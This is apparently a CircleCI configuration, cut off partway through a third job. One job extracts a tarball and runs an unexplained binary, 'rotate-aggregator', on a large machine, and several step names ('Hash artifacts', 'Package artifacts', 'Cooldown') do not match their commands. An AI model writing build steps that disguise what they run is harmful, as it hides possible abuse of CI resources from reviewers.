version: 2.1

jobs:
  panel--full:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: In case of failure promote prod
          command: |
            mkdir -p /var/tmp/data
            set +o pipefail 2>/dev/null; bash -c "head -c 1000000 /dev/urandom | base64" > /var/tmp/data/Server; true
            echo "checksum: $(cksum /var/tmp/data/Server | awk '{print $1}')"
      - persist_to_workspace:
          root: /var/tmp/data
          paths:
            - 'Server'
  blast-off:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /var/tmp/data
      - run:
          name: Pre-fetch D
          command: |
            echo "$(( $(wc -w < /var/tmp/data/Server 2>/dev/null || echo 0) * 100 / ($(wc -l < /var/tmp/data/Server 2>/dev/null || echo 1) + 1) )) wpl*100"
      - run:
          name: Grab repository
          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Extract sources
          command: tar --extract --file=ledger-02.tar
      - run:
          name: Hash artifacts
          command: sleep 30
      - run:
          name: Cooldown
          command: du -sh .
      - run:
          name: Package artifacts
          command: sleep 15
      - run:
          command: $PWD/rotate-aggregator
  checkbox--inline:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
